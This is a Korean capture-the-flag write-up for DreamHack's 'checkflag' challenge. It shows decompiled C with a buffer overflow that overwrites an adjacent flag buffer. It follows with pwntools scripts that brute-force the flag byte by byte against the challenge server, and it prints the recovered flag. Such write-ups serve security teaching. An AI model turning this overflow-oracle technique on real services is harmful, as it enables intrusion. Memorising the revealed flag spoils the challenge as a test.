# [DreamHack] checkflag

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 플래그를 입력하면 정답 여부를 확인하는 바이너리를 통해 플래그를 추출하는 문제입니다.
>
> 플래그는 `DH{...}` 형식이며, printable ASCII 문자(`0x20-0x7e`)로만 이루어져 있습니다.
>
> Release: [checkflag.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8608397/checkflag.zip)

## Analysis

```c
  flag_fp = fopen("flag", "r");
  if ( !flag_fp )
LABEL_8:
    exit(1);
  _flag_fp = flag_fp;
  fgets(flag, 64, flag_fp);
  fclose(_flag_fp);
  fputs("What's the flag? ", _bss_start);
  fflush(_bss_start);
  flag_input_len = read(0, flag_input, 200uLL);
  v8 = _bss_start;
  if ( (__int64)strlen(flag) > flag_input_len || strcmp(flag_input, flag) )
  {
    fputs("Failed!\n", v8);
    goto LABEL_8;
  }
  fputs("Correct!\n", v8);
```

플래그 파일의 내용을 읽어와서 `flag`에 저장하고, 사용자의 입력을 `flag_input`에 받아온다. 이 과정에서 `flag_input_len = read(0, flag_input, 200uLL)`에서 BOF가 발생하는데, `flag_input`과 `flag`는 메모리 상에서 인접해 있으므로, `flag`를 원하는 값으로 덮을 수 있다.

## Exploit

`flag`를 덮어서 `flag_input`과 같게 만들면 Correct!가 출력되기는 하지만 플래그를 알아낼 수 없으므로 소용이 없다.

`flag`에서 마지막 1바이트만 남기고 덮으면 그 1바이트에 대해 브루트포싱을 할 수 있다. 마지막 1바이트를 알아냈다면 그 앞의 1바이트를 남기고 덮어서 마찬가지로 브루트포싱을 할 수 있다. 이런 식으로 계속하면 플래그를 획득할 수 있다.

### Find out length of flag

먼저 뒤에서부터 `'\x00'`로 한 글자씩 줄이면서 플래그의 길이를 알아낸다.

```python
# Find out length of flag

for i in range(0x40):
    if not REMOTE:
        r = process('./release/checkflag')
    else:
        r = remote('host1.dreamhack.games', 17255)

    sa = r.sendafter

    payload = b'a' * (0x40 - i - 1)
    payload += b'\x00' * (i + 1)

    payload += b'a' * (0x40 - i - 1)

    sa('What\'s the flag? ', payload)

    if b'Correct!' in r.recvline():
        flag_len -= 1
        r.close()
    else:
        r.close()
        break

log.info('length of flag: ' + hex(flag_len))
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 17255: Done
[*] Closed connection to host1.dreamhack.games port 17255
...
[+] Opening connection to host1.dreamhack.games on port 17255: Done
[*] Closed connection to host1.dreamhack.games port 17255
[*] length of flag: 0x10
```

플래그의 길이는 `0x10`바이트이다.

### Find out flag

플래그는 `0x20`~`0x7e` 범위의 문자로 구성되어 있다. 앞에서 설명한 방법대로 한 글자씩 브루트포싱을 하면 된다.

```python
# Find out flag

for i in range(flag_len):
    for char in range(0x20, 0x7f):
        if not REMOTE:
            r = process('./release/checkflag')
        else:
            try:
                r = remote('host1.dreamhack.games', 17255)
            except:
                r = remote('host1.dreamhack.games', 17255) # connection is unstable

        sa = r.sendafter

        payload = b'a' * (flag_len - i - 1)
        payload += bytes([char])
        payload += flag
        payload += b'\x00' * (0x40 - flag_len)

        payload += b'a' * (flag_len - i - 1)
        
        sa('What\'s the flag? ', payload)

        if b'Correct!' in r.recvline():
            flag = bytes([char]) + flag
            print(flag)
            r.close()
            break
        else:
            r.close()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 17255: Done
[*] Closed connection to host1.dreamhack.games port 17255
...
[+] Opening connection to host1.dreamhack.games on port 17255: Done
b'DH{RHP1_ZPWR2G!}'
[*] Closed connection to host1.dreamhack.games port 17255
```
